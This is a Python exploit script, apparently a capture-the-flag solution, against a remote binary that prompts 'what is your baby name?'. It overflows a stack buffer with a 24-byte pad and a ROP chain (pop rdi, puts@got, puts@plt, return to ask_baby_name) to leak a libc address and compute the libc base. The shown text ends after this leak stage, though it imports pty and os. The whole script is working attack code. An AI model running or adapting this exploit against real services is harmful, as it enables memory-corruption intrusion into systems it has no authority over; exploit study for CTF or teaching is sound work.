#!/bin/env python
import sys; 
import socket;
import argparse;
from struct import pack; 
import os, pty;

parser=argparse.ArgumentParser();
parser.add_argument("host", help="remote host to connect to")
parser.add_argument("port", type=int, help="remote port to connect to")
args=parser.parse_args()

offset=24 

gethex=lambda bstr: "".join(f'{hex(c)[2:]:0>2}' for c in bstr) #[2:] to remove 0x, :0>2 to pad the single digit
getaddr=lambda bstr: gethex(pack("<Q",int(f'{gethex(bstr):0<16}', base=16)))
getaddratoffset=lambda addr, offset: hex(int(addr,16)-offset)[2:].rjust(16,"0")
p64=lambda addr: pack("<Q",int(addr,16))

def recvto(s,rawstr):
    bytez=b""
    while True:
        bytez+=s.recv(4096)
        if bytez.endswith(rawstr):
            break
    return bytez

###### part 1 verify the version of libc by means of str_sh_addr 
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((args.host, args.port))
    print(recvto(s,b"what is your baby name?\x0a").decode("utf-8"),end="")
    payload=[ b"A"*offset,                      #padding
          b"\x5b\x14\x40\x00" + b"\x00"*4,      #rop of pop rdi +ret
          b"\x18\x40\x40\x00" + b"\x00"*4,      #puts@got
          b"\x30\x10\x40\x00" + b"\x00"*4,      #puts@plt
          b"\xdc\x11\x40\x00" + b"\x00"*4,      #&ask_baby_name
          b"\x0a" ]
    s.sendall(b"".join(payload))
    msg=recvto(s,b"what is your baby name?\x0a")
#    print(f"{msg}");
    blines=msg.split(b"\x0a")
#   print(list(map(gethex,blines)))
    leaked_addr=getaddr(blines[0])
    print(f'leaked address: {leaked_addr}')
    libc_base_addr=getaddratoffset(leaked_addr,0x765f0) #0x765f0 is the puts vaddr in symbol table of remote libc 
    print(f'libc base address: {libc_base_addr}')
    print(blines[1].decode("utf-8"))
 
